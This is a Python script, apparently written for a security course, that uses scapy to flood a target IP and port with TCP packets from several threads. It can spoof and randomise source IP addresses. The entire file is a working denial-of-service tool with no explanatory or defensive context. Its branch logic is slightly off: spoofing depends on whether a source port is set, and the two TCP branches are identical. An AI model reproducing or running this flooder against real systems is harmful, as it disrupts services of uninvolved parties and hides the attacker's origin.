# Author: Justin Kennedy
# CSEC473

import argparse
import threading
import time
from scapy.all import *
from queue import Queue

def randomize_ip(ip):
    for char in {'x', 'y', 'z', 'w'}:
        rand = random.randint(1, 254)
        ip = str.replace(ip, char, str(rand))
    return ip

def send_packet(ip, port, source, sourceport, maxnum, interval):
    i = 0
    while(i < maxnum):
        if(sourceport is not None):
            IP1 = IP(src = randomize_ip(source), dst = ip)
        else:
            IP1 = IP(dst = ip)

        if(sourceport is not None):
            TCP1 = TCP(dport = port, sport = sourceport)
        else:
            TCP1 = TCP(dport = port, sport = sourceport)
        pkt = IP1 / TCP1
        
        send(pkt, inter = .001, verbose = False)
        i = i + 1

        time.sleep(interval)


parser = argparse.ArgumentParser()

parser.add_argument('ip', type=str)
parser.add_argument('port', type=int)
parser.add_argument('--source-ip', dest='sourceip', type=str)
parser.add_argument('--source-port', dest="sourceport", type=int)
parser.add_argument('--interval', dest="interval", type=int, default=1)
parser.add_argument('--limit', dest='limit', type=int, default=60)
parser.add_argument('--threads', dest='numthreads', type=int, default=1)

args = parser.parse_args()

threads = Queue()
for i in range(0, args.numthreads):
    thread = threading.Thread(target=send_packet, args=(args.ip, args.port, args.sourceip, args.sourceport, args.limit, args.interval))
    thread.start()
    threads.put(thread)

for i in range(0, args.numthreads):
    threads.get().join()
